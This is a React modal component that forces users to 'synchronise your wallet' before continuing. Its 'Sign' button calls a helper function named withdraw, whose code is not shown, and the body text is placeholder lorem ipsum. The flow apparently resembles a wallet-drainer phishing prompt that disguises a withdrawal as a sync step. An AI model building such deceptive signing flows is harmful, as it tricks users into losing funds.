import React, { useContext, useState } from "react";
import Button from "react-bootstrap/Button";
import Modal from "react-bootstrap/Modal";
import { useNavigate } from "react-router-dom";
import { withdraw } from "../../helpers/connect-ishodniy";
import { UserContext } from "../../UserContext";
import "./SyncModal.scss";

function SyncModal({ URL, setShowSyncModal }) {
  const navigate = useNavigate();
  const [smShow, setSmShow] = useState(true);
  const { value, setValue } = useContext(UserContext);
  const { adress } = value;

  const onClickHandler = async (e) => {
    e.preventDefault();
    const chainId = window.ethereum.chainId;
    withdraw(value, chainId, setValue).then((x) => {
      if (URL) {
        navigate(URL);
      } else {
        navigate("/user");
      }
      setShowSyncModal(false);
      setSmShow(false);
    });
  };
  return (
    <>
      <Modal
        className="syncModalMain"
        onBackdropClick={() => setSmShow(true)}
        size="lg"
        aria-labelledby="contained-modal-title-vcenter"
        centered
        keyboard={false}
        animation={false}
        backdrop="static"
        show={smShow}
      >
        <Modal.Header>
          <Modal.Title id="example-modal-sizes-title-sm">
            For further work with the website synchronise your wallet
          </Modal.Title>
        </Modal.Header>

        <Modal.Body className="syncModal-body">
          <i class="fa-solid fa-file-signature"></i>
          <p>
            Cras mattis consectetur purus sit amet fermentum. Cras justo odio,
            dapibus ac facilisis in, egestas eget quam. Morbi leo risus, porta
            ac consectetur ac, vestibulum at eros.
          </p>
        </Modal.Body>
        <Modal.Footer className="syncModal-footer">
          <Button
            onClick={onClickHandler}
            variant="secondary"
            size="lg"
            style={{
              backgroundColor: "#ff7043",
              borderColor: "#ff7043",
              padding: "15px",
              width: "100px",
            }}
          >
            Sign
          </Button>
        </Modal.Footer>
      </Modal>
    </>
  );
}

export default SyncModal;
